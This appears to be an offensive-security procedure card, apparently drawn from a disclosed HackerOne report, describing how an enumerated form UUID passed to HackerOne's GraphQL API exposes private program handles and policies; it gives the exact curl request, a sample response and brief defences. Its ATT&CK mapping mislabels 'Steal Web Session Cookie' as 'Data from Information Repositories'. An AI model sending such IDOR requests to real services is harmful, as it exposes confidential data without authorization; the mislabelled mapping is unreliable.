---
id: proc-use-uuid-query-program-details
tags:
  - information-disclosure
  - graphql
  - private-program-access
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/graphql-query-program-details]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T17:25:53.640Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---
# Use-UUID-to-Query-Private-Program-Details

## Summary

This procedure uses an enumerated UUID from an EmbeddedSubmissionForm to query HackerOne's GraphQL endpoint for sensitive team details, such as handles and policies, achieving unauthorized information disclosure.

## Description

By appending the UUID as a query parameter (`embedded_submission_form_uuid=:uuid`), the GraphQL query expands the node to include team fields like `handle` and `policy`. Lack of authorization checks exposes private program data (terms, bounties, resolved bugs) equivalent to invited reporter access. This final step completes the IDOR chain on the public API.

## Requirements

1. Extracted UUID from previous query (e.g., `█████████`).
2. Node ID for the form.
3. HTTP client for POST requests.

## Defense

Defensive measures and detection strategies:

- Add permission checks when querying team objects via UUID.
- Restrict sensitive fields in GraphQL schema for unauthenticated users.
- Monitor for UUID usage in unauthorized contexts.

## Objectives

1. Retrieve private program information using the UUID.
2. Expose confidential details like policies and handles.
3. Demonstrate full impact of the IDOR chain.

## Instructions

### Step 1: Query with UUID Parameter

**Context**: Include the UUID in the endpoint URL and query for team details.

**Command** ([[commands/graphql-query-program-details]]):
```bash
curl -X POST "https://api.hackerone.com/graphql?embedded_submission_form_uuid=█████████" \
  -H "Content-Type: application/json" \
  -d '{"query": "query { node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on EmbeddedSubmissionForm { id, uuid team { handle policy } } } }", "variables": {}}'
```

> Response contains sensitive data, e.g., `{ "data": { "node": { "team": { "handle": "██████████", "policy": "The policy." } } } }`. Post-fix may return null for unauthorized access.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Steal Web Session Cookie]] Data from Information Repositories

### Sub-Techniques

- None

## Commands Used

- [[commands/graphql-query-program-details]]

## Tools Used

- None

## Tags

- [[information-disclosure]]
- [[graphql]]
- [[private-program-access]]
